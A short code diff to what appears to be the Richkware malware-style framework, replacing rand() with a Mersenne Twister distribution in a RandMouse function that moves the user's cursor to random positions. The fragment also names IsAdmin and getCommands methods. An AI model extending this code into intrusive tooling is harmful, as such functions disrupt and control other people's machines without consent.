@@ -2,6 +2,7 @@
 *      Copyright 2016 Riccardo Melioli.
 */
 
+#include <random>
 #include "richkware.h"
 
 BOOL Richkware::IsAdmin() {
@@ -87,7 +88,13 @@ void Richkware::RandMouse() {
     long vertical = desktop.bottom;
 
     // move cursor
-    SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
+    // move cursor
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<> disH(1, horizontal);
+    std::uniform_int_distribution<> disV(1, vertical);
+
+    SetCursorPos(disH(gen), disV(gen));
 }
 
 std::vector<std::string> Richkware::getCommands() {
